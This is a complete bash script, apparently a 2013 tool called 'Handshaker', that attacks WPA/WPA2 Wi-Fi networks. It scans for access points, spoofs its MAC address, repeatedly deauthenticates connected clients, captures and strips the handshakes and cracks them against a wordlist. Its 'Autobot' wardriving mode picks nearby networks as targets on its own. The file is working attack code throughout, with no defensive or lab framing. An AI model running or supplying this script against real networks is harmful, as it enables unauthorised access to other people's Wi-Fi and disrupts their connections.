#!/bin/bash

## Handshaker Copyright 2013, rfarage (rfarage@yandex.com)
#
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.

fhelp()																	#Help
{
	clear
	echo """ 
handshaker - Detect, deauth, capture and crack WPA/2 handshakes
	
	Usage: 	handshaker <Method> <Options> [in any order]
	
	Method:
		-a - Autobot or Wardriving mode
		-e - Search for AP by partial unique ESSID
		-l - Scan for APs and present a target list
	Options:
		-i - Wireless Interface card
		-w - Wordlist to use for cracking
		-h - This help
			
	Examples: 
		 handshaker -e Hub3-F -i wlan0 -w wordlist.txt	 ~ Search for APs like 'Hub3-F' using wlan0 and crack
		 handshaker -a -i wlan0 			 ~ Autobot or wardriving mode using wlan0
"""
	exit
}

fbotstart()																#Automagically find active clients and collect new handshakes
{	
	if [ $(which beep) -z ] 2> /dev/null
		then
			$COLOR 1;echo " [*] You need beep to be able to hear new handshakes, do you want to install now? [Y/n] ";$COLOR 9
			read -p "  >" DOINSTALL
			case $DOINSTALL in
				"")if [ $(whoami) = 'root' ] 2> /dev/null
						then
							apt-get install beep
						else
							sudo apt-get install beep
					fi;clear;;
				"y")if [ $(whoami) = 'root' ] 2> /dev/null
						then
							apt-get install beep
						else
							sudo apt-get install beep
					fi;clear;;
				"Y")if [ $(whoami) = 'root' ] 2> /dev/null
						then
							apt-get install beep
						else
							sudo apt-get install beep
					fi;clear;;
			esac
	fi
	ifconfig mon0 down
	macchanger -a mon0
	ifconfig mon0 up
	sleep 0.5
	clear
	$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
	echo
	$COLOR 4;echo " [*] Scanning for new active clients.. ";$COLOR 9
	echo
	$COLOR 1;echo " [>] EVALUATING TARGET [<] ";$COLOR 9
	$COLOR2 1;echo " [*] ESSID: "
	echo " [*] BSSID: "
	echo " [*] CLIENT: "
	echo " [*] CHANNEL: "
	echo " [*] POWER: ";$COLOR2 9
	airodump-ng mon0 -f 500 -a -w $HOME/tmp -o csv --encrypt WPA&
	DONE=""
	MNUM=0
	LNUM=0
	sort -u /usb/cap/handshakes/got > /usb/cap/handshakes/got2
	mv /usb/cap/handshakes/got2 /usb/cap/handshakes/got
	modprobe pcspkr
	fhunt
}

fhunt()																	#find new active clients that havn't been handshaked yet for autobot
{
	rm -rf /usb/tmp5 2> /dev/null
	sleep 0.7
	if [ ! -f /usb/tmp-01.csv ] 2> /dev/null
		then
			sleep 1
			fhunt
	fi
	BSSIDS="$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep ':' | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)"
	if [ $BSSIDS -z ] 2> /dev/null
		then
			fhunt
	fi
	echo "$BSSIDS" > /usb/tmp6
	while read LINE
		do
			if [ $( cat /usb/cap/handshakes/got | grep $LINE) -z ] 2> /dev/null
				then
					echo "$LINE" >> /usb/tmp7
			fi
		done </usb/tmp6
	if [ -f /usb/tmp7 ] 2> /dev/null
		then
			BSSIDS=$(cat /usb/tmp7)
		else
			fhunt
	fi
	MCNT=$(wc -l /usb/tmp7)
	MCNT=${MCNT:0:2}
	if [ $MCNT -le 9 ] 2> /dev/null
		then
			MCNT=${MCNT:0:1}
	fi
	rm -rf /usb/tmp7
	if [ $MNUM -ge $MCNT ] 2> /dev/null
		then
			MNUM=0
	fi
	MNUM=$((MNUM + 1))
	BSSID=$(echo "$BSSIDS" | sed -n "$MNUM"p)
	if [ $BSSID -z ] 2> /dev/null
		then
			fhunt
	fi
	ESSID=$(cat /usb/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 14 | head -n 1)
	ESSID=${ESSID:1}
	if [ $ESSID -z ] 2>/dev/null
		then
			fhunt
		else
			cat /usb/tmp-01.csv | grep Station -A 20 | grep ":" | cut -d ',' -f 4,6 | tr -d '(not associated)' > /usb/tmp4
			while read LINE
				do
					if [ $(echo $LINE | cut -d ',' -f 2) -z ] 2> /dev/null
						then
							A=1
						else
							echo "$LINE" >> /usb/tmp5
					fi
				done < /usb/tmp4
			POWER=$(cat /usb/tmp5 | grep $BSSID | head -n 1 | cut -d ',' -f 1)
			POWER=${POWER:1}
			CHAN=$(cat /usb/tmp-01.csv | grep "$BSSID" | grep "WPA" | cut -d ',' -f 4 | head -n 1)
			CHAN=$((CHAN + 1 - 1))
			CLIE=$(cat /usb/tmp-01.csv | grep 'Station' -A 20 | grep "$BSSID" | cut -d ',' -f 1 | head -n 1)
			clear
			$COLOR 1;$COLOR2 2;echo " [>] AUTOBOT ENGAGED [<] ";$COLOR 9;$COLOR2 9
			echo
			$COLOR 4;echo " [*] Scanning for new active clients.. ";$COLOR 9
			echo
			$COLOR 1;echo " [>] EVALUATING TARGET [<] ";$COLOR 9
			$COLOR2 1;echo " [*] ESSID: $ESSID"
			echo " [*] BSSID: $BSSID"
			echo " [*] CLIENT: $CLIE"
			echo " [*] CHANNEL: $CHAN"
			echo " [*] POWER: $POWER";$COLOR2 9
			$COLOR 1;echo " [*] We need this handshake [*] ";$COLOR 9
			DEPASS=""
			fautocap
	fi
	
	fhunt
}

fautocap()
{
	killall airodump-ng
	rm -rf /usb/tmp*
	sleep 0.2
	airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
	DONE=""
	CLINUM=1
	DECNT=0
	beep -f 1000 -l 10
	beep -f 1600 -l 100
	while [ $DONE -z ] 2> /dev/null
		do
			if [ $DEPASS = "1" ] 2> /dev/null
				then
					echo "$(cat $HOME/tmp1-01.csv | grep 'Station' -A 20 | grep ':' | cut -d ',' -f 1 | sort -u)" > /usb/tmp8
					CLICNT=$(wc -l /usb/tmp8)
					CLICNT=${CLICNT:0:1}
					if [ $CLINUM -gt $CLICNT ] 2> /dev/null
						then
							CLINUM=1
					fi
					if [ $(cat /usb/tmp8) -z ] 2> /dev/null
						then
							A=1
						else
							CLIE=$(cat /usb/tmp8 | sed -n "$CLINUM"p)
							CLINUM=$((CLINUM + 1))
					fi
					
			fi
			clear
			CLINUMP=$((CLINUM - 1))
			$COLOR2 1;echo " [>] STOP THE CAR! [<] "
			$COLOR 2;echo " [*] TARGET ESSID: $ESSID LOADED [*] "
			echo " [*] TARGET CLIENT $CLINUMP: $CLIE LOADED [*]";$COLOR2 9;$COLOR 9
			echo
			sleep 0.7
			echo " [>] FIRE! [<] "
			$COLOR 1;$COLOR2 4;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR2 9;$COLOR 9
			echo
			sleep 3
			$COLOR 4;echo " [*] Analyzing pcap for handshake [*] ";$COLOR 9
			DONE2=""
			fanalyze
			DECNT=$((DECNT + 1))
			DEPASS=1
			
			if [ $GDONE = "1" ] 2> /dev/null
				then
					DONE=1
				else
					beep -f 100 -l 100
					beep -f 50 -l 100
					$COLOR 1; echo " [*] No handshake detected ";$COLOR 9
					$COLOR 1; echo $ANALYZE | grep spread | cut -d ',' -f 2,3,4,5;$COLOR 9
					sleep 0.2
					DONE=""
					if [ $DECNT -gt 3 ] 2> /dev/null
						then
							killall airodump-ng
							fbotstart
					fi
			fi
					
		done
#	beep -f 1200 -l 3 -r 2
#	beep -f 1500 -l 3 -r 1
#	beep -f 1600 -l 5 -r 1
#	beep -f 1800 -l 3 -r 1
	clear
	$COLOR 2;$COLOR2 1;echo " [*] Handshake capture was successful!, Horray for AUTOBOT! [*] ";$COLOR 9;$COLOR2 9
	echo
	ESSID=$(echo "$ESSID" | sed 's/ /_/g')
	DATE=$( date +%Y_%m_%d_%H%M%S )
 	$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/cap/handshakes/$ESSID-$DATE.cap [*] ";$COLOR 9
	$COLOR 4;$COLOR2 1;echo " [>] AUTOBOT WILL RESUME IN 3 SECONDS [<] ";$COLOR 9;$COLOR2 9
	echo
	GDONE=""
	killall airodump-ng
	echo "$ESSID - BSSID:$BSSID CH:$CHAN" >> /usb/cap/handshakes/got
	pyrit -r $HOME/tmp1-01.cap -o "/usb/cap/handshakes/$ESSID-$DATE.cap" strip | grep 'New pcap-file'
	$COLOR 2;echo $ANALYZE | grep spread | cut -d ',' -f 2,3,4,5;$COLOR 9
	rm -rf $HOME/tmp*
	sleep 2
	fbotstart
}		

fanalyze()																#Analyze handshakes
{
	GDONE=""
	while [ $(echo $ANALYZE | grep $BSSID) -z ] 2> /dev/null
		do
			sleep 0.5
			ANALYZE=$(pyrit -r /usb/tmp1-01.cap analyze 3> /dev/null)
			if  [ $(echo $ANALYZE | grep "$ESSID") -z ] 2> /dev/null
				then
					A=1
				else
					break
			fi
		done

	while [ $DONE2 -z ] 2> /dev/null
		do
			echo "$ANALYZE" > /usb/tmp4
			if  [ $(echo $ANALYZE | grep "$ESSID") -z ] 2> /dev/null
				then
					A=1
				else
					DONE2=1
			fi
			if [ $(cat /usb/tmp4 | grep "bad") -z ] 2> /dev/null
				then
					A=1
				else
					DONE2=1
			fi
			
			if [ $(cat /usb/tmp4 | grep "workable") -z ] 2> /dev/null
				then
					A=1
				else
					DONE2=1
					GDONE=1
			fi
			if [ $(cat /usb/tmp4 | grep "good") -z ] 2> /dev/null
				then
					A=1
				else
					DONE2=1
					GDONE=1
			fi
		done
	
	
}

fapscan()																#Determine target AP BSSID and channel
{
	clear
	airodump-ng mon0 -a -w /usb/tmp -o csv --encrypt WPA&
	$COLOR 2;echo " [*] Scanning for AP's with names like $PARTIALESSID [*] ";$COLOR 9
	while [ $DONE -z ] 2> /dev/null
		do
			sleep 0.3
			if [ -f /usb/tmp-01.csv ] 2> /dev/null
				then
					DONE=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID)
					ESSID=$(cat $HOME/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 14 | head -n 1)
			fi
			if [ $ESSID -z ] 2> /dev/null
				then
					DONE=""
			fi
		done
	sleep 0.5
	killall airodump-ng
	ESSID=${ESSID:1}
	CHAN=$(cat /usb/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 4 | head -n 1)
	CHAN=$((CHAN + 1 - 1))
	cat /usb/tmp-01.csv | grep $PARTIALESSID | cut -d ',' -f 1 | head -n 1 > /usb/tmp4.csv
	BSSID=$(cat /usb/tmp4.csv)
	fclientscan
}

flistap()																#List all APs
{
	airodump-ng mon0 -a -w /usb/tmp -o csv --encrypt WPA&
	clear
	$COLOR 4;echo " [*] Scanning for APs, Please wait.. ";$COLOR 9
	sleep 10
	killall airodump-ng
	echo "$(cat $HOME/tmp-01.csv | grep WPA | cut -d ',' -f 14)" > /usb/tmp1
	LNUM=0
	while read LINE
		do
			LNUM=$((LNUM + 1))
			case $LNUM in 1)ESSID1=" [1] $LINE";;2)ESSID2=" [2] $LINE";;3)ESSID3=" [3] $LINE";;4)ESSID4=" [4] $LINE";;5)ESSID5=" [5] $LINE";;6)ESSID6=" [6] $LINE";;7)ESSID7=" [7] $LINE";;8)ESSID8=" [8] $LINE";;9)ESSID9=" [9] $LINE";;10)ESSID10=" [10] $LINE";;11)ESSID11=" [11] $LINE";;12)ESSID12=" [12] $LINE";;13)ESSID13=" [13] $LINE";;14)ESSID14=" [14] $LINE";;15)ESSID15=" [15] $LINE";;16)ESSID16=" [16] $LINE";;17)ESSID17=" [17] $LINE";;18)ESSID18=" [18] $LINE";;19)ESSID19=" [19] $LINE";;20)ESSID20=" [20] $LINE";;21)ESSID21=" [21] $LINE";;22)ESSID22=" [22] $LINE";;23)ESSID23=" [23] $LINE";;24)ESSID24=" [24] $LINE";;25)ESSID25=" [25] $LINE";;26)ESSID26=" [26] $LINE";;27)ESSID27=" [27] $LINE"  ;esac
		done </usb/tmp1
	clear
	if [ $LNUM -gt 27 ] 2> /dev/null
		then
			LNUM=27
	fi
	$COLOR 4;echo " [*] $LNUM APs found:";$COLOR 9
	DNUM=0
	while [ $DNUM -le $LNUM ]
		do
			DNUM=$((DNUM + 1))
			case $DNUM in 1)echo $ESSID1;;2)echo $ESSID2;;3)echo $ESSID3;;4)echo $ESSID4;;5)echo $ESSID5;;6)echo $ESSID6;;7)echo $ESSID7;;8)echo $ESSID8;;9)echo $ESSID9;;10)echo $ESSID10;;11)echo $ESSID11;;12)echo $ESSID12;;13)echo $ESSID13;;14)echo $ESSID14;;15)echo $ESSID15;;16)echo $ESSID16;;17)echo $ESSID17;;18)echo $ESSID18;;19)echo $ESSID19;;20)echo $ESSID20;;21)echo $ESSID21;;22)echo $ESSID22;;23)echo $ESSID23;;24)echo $ESSID24;;25)echo $ESSID25;;26)echo $ESSID26;;27)echo $ESSID27;esac
		done
	$COLOR 4;echo " [>] Please choose an AP ";$COLOR 9
	read -p "  >" AP
	case $AP in 1)ESSID=${ESSID1:5};;2)ESSID=${ESSID2:5};;3)ESSID=${ESSID3:5};;4)ESSID=${ESSID4:5};;5)ESSID=${ESSID5:5};;6)ESSID=${ESSID6:5};;7)ESSID=${ESSID7:5};;8)ESSID=${ESSID8:5};;9)ESSID=${ESSID9:5};;10)ESSID=${ESSID10:5};;11)ESSID=${ESSID11:5};;12)ESSID=${ESSID12:5};;13)ESSID=${ESSID13:5};;14)ESSID=${ESSID14:5};;15)ESSID=${ESSID15:5};;16)ESSID=${ESSID16:5};;17)ESSID=${ESSID17:5};;18)ESSID=${ESSID18:5};;19)ESSID=${ESSID19:5};;20)ESSID=${ESSID20:5};;21)ESSID=${ESSID21:5};;22)ESSID=${ESSID22:5};;23)ESSID=${ESSID23:5};;24)ESSID=${ESSID24:5};;25)ESSID=${ESSID25:5};;26)ESSID=${ESSID26:5};;27)ESSID=${ESSID27:5};esac
	BSSID=$(cat /usb/tmp-01.csv | grep "WPA" | grep $ESSID | cut -d ',' -f 1)
	CHAN=$(cat /usb/tmp-01.csv | grep "WPA" | grep $ESSID | cut -d ',' -f 4)
	CHAN=$((CHAN + 1 - 1))
	fclientscan
}

fclientscan()															#Find active clients
{
	rm -rf /usb/tmp* 2> /dev/null
	CNT="0"
	clear
	$COLOR 2;echo " [*] Attacking $ESSID BSSID:$BSSID CHANNEL:$CHAN [*] "
	echo
	$COLOR 4;echo ' [*] Please wait while I find active clients.. [*] ';$COLOR 9
	airodump-ng mon0 --bssid $BSSID -c $CHAN -w $HOME/tmp1&
	DONE=""
	while [ $DONE -z ] 2> /dev/null
		do
			sleep 0.3
			DONE=$(cat /usb/tmp1-01.csv 2> /dev/null | grep 'Station' -A 20 | grep $BSSID)
		done
	DONE=$(cat /usb/tmp1-01.csv 2> /dev/null | grep 'Station' -A 20 | grep $BSSID)
	echo "$DONE" > /usb/tmp
	while read LINE
		do
			echo "${LINE:0:17}" >> /usb/tmp1
		done </usb/tmp
	CNT=$(wc -l /usb/tmp)
	CNT=${CNT:0:2}
	if [ ${CNT:1:1} = " " ] 2> /dev/null
		then
			CNT=${CNT:0:1}
	fi
	fcap
}

fcap()																	#Deauth, capture and strip handshakes
{
	CHKEX="0"
	if [ $CNT = 1 ] 2> /dev/null
		then
			CLIE=$(head -n 1 /usb/tmp1)
		else
			$COLOR 2;echo " [*] $CNT active clients found: ";$COLOR 9
			cat /usb/tmp1
			echo
			$COLOR 4;echo " [>] Please paste client MAC or Press Enter to use the first one: ";$COLOR 9 
			read -p "  >" CLIE
	fi
	if [ $CLIE -z ] 2> /dev/null
		then
			CLIE=$(head -n 1 /usb/tmp1)
	fi
	DONE=""
	while [ $DONE -z ] 2> /dev/null
		do
			clear
			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE ";$COLOR 9;$COLOR2 9
			echo
			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
			echo
			sleep 3
			$COLOR 4;echo " [*] Analyzing pcap for handshake [*] ";$COLOR 9
			sleep 3
			fanalyze
			if [ $GDONE -z ]
				then
					DONE=""
				else
					DONE=1
			fi
			sleep 0.5
		done
	GDONE=""
	$COLOR 2;echo " [*] Handshake capture successful! "; $COLOR 9
	killall airodump-ng
	clear
	if [ $(cat /cap/handshakes/got | grep $BSSID) -z ] 2>/dev/null
		then
			echo "$ESSID - BSSID:$BSSID CH:$CHAN" >> /usb/cap/handshakes/got
	fi
	$COLOR 4;echo " [*] Saving and stripping handshake, please wait... [*] ";$COLOR 9
	DATE=$( date +%Y_%m_%d_%H%M%S )
	ESSID=$(echo "$ESSID" | sed 's/ /_/g')
	pyrit -r /usb/tmp1-01.cap -o /usb/cap/handshakes/$ESSID-$DATE.cap strip | grep 'New pcap-file'
	airmon-ng stop mon0
	rm -rf /usb/tmp*
	clear
	$COLOR 2;echo " [*] Handshake capture was successful!, Horray for you ";$COLOR 9
	$COLOR 2;echo " [*] Handshake saved to /usb/cap/handshakes/$ESSID-$DATE".cap "";$COLOR 9
	if [ $WORDLIST -z ] 2> /dev/null
		then
			$COLOR 4; echo " [>] Do you want to crack now? [Y/n] ";$COLOR 9
			read -p "  >" DOCRK
			case $DOCRK in
				"")fcrack;;
				"Y")fcrack;;
				"y")fcrack;;
				"n")fexit;;
				"N")fexit
			esac
		else
			fcrack
	fi
	fexit
}

fcrack()																#Crack handshakes
{
	clear
	if [ $WORDLIST -z ] 2> /dev/null
		then
			$COLOR 4;echo " [>] Please enter the full path of a wordlist to use ";$COLOR 9
			read -e -p "  >" WORDLIST
	fi
	if [ ! -f $WORDLIST ] 2> /dev/null
		then
			$COLOR 1;echo " [*] ERROR: $WORDLIST not found, try again..";$COLOR 9
			WORDLIST=""
			sleep 1
			fcrack
		else
			aircrack-ng -w $WORDLIST /usb/cap/handshakes/$ESSID-$DATE".cap"
	fi
	fexit
}

fexit()																	#Exit
{
	tput setab 9
	killall aircrack-ng 2> /dev/null
	rm -rf /usb/tmp* 2> /dev/null
	MOND=$(ifconfig | grep mon0)
	if [ $MOND -z ] 2> /dev/null
		then
			exit
		else
			airmon-ng stop mon0
	fi
	exit
}

fstart()																#Startup
{
	COLOR="tput setab"
	COLOR2="tput setaf"
	CHKEX=1
	MOND=$(ifconfig | grep mon0)
	mkdir -p /usb/cap
	mkdir -p /usb/handshakes
	touch /usb/cap/handshakes/got
	MNUM=0

	if [ $MOND -z ] 2> /dev/null
		then
			clear
			$COLOR 4;echo " [>] Which interface do you want to use?: ";$COLOR 9
			echo
			iwconfig | grep "wlan"
			echo
			read -p "  >wlan" NIC
			NIC="wlan"$NIC
			clear
			airmon-ng start $NIC
			clear
		else
			NIC="mon0"
			clear
	fi
	
	if [ $(ifconfig | grep mon0) -z ] 2> /dev/null
		then
			$COLOR 1;echo " [*] ERROR: $NIC is not available";$COLOR 9
			fexit
	fi
	
	if [ $AUTO = "Y" ] 2> /dev/null
		then
			fbotstart
	fi
	
	ifconfig mon0 down
	macchanger -a mon0
	ifconfig mon0 up
	
	if [ $DO = "L" ] 2> /dev/null
	then
		flistap
	else
		fapscan
	fi
}

trap fexit 2
																		#Parse command line arguments
case $1 in "-l")DO="L";;"-h")fhelp;;"-e")PARTIALESSID=$2;;"-i")MOND=$(ifconfig | grep mon0);if [ $MOND -z ] 2> /dev/null;then airmon-ng start $2;fi;;"-w")WORDLIST=$2;;"-a")AUTO="Y";esac
case $2 in "-l")DO="L";;"-h")fhelp;;"-e")PARTIALESSID=$3;;"-i")MOND=$(ifconfig | grep mon0);if [ $MOND -z ] 2> /dev/null;then airmon-ng start $3;fi;;"-w")WORDLIST=$3;;"-a")AUTO="Y";esac
case $3 in "-l")DO="L";;"-h")fhelp;;"-e")PARTIALESSID=$4;;"-i")MOND=$(ifconfig | grep mon0);if [ $MOND -z ] 2> /dev/null;then airmon-ng start $4;fi;;"-w")WORDLIST=$4;;"-a")AUTO="Y";esac
case $4 in "-l")DO="L";;"-h")fhelp;;"-e")PARTIALESSID=$5;;"-i")MOND=$(ifconfig | grep mon0);if [ $MOND -z ] 2> /dev/null;then airmon-ng start $5;fi;;"-w")WORDLIST=$5;;"-a")AUTO="Y";esac
case $5 in "-l")DO="L";;"-h")fhelp;;"-e")PARTIALESSID=$6;;"-i")MOND=$(ifconfig | grep mon0);if [ $MOND -z ] 2> /dev/null;then airmon-ng start $6;fi;;"-w")WORDLIST=$6;;"-a")AUTO="Y";esac
case $6 in "-l")DO="L";;"-h")fhelp;;"-e")PARTIALESSID=$7;;"-i")MOND=$(ifconfig | grep mon0);if [ $MOND -z ] 2> /dev/null;then airmon-ng start $7;fi;;"-w")WORDLIST=$7;;"-a")AUTO="Y";esac
case $7 in "-l")DO="L";;"-h")fhelp;;"-e")PARTIALESSID=$8;;"-i")MOND=$(ifconfig | grep mon0);if [ $MOND -z ] 2> /dev/null;then airmon-ng start $8;fi;;"-w")WORDLIST=$8;;"-a")AUTO="Y";esac

if [ $# -lt 1 ] 2> /dev/null
	then
		fhelp
fi

fstart
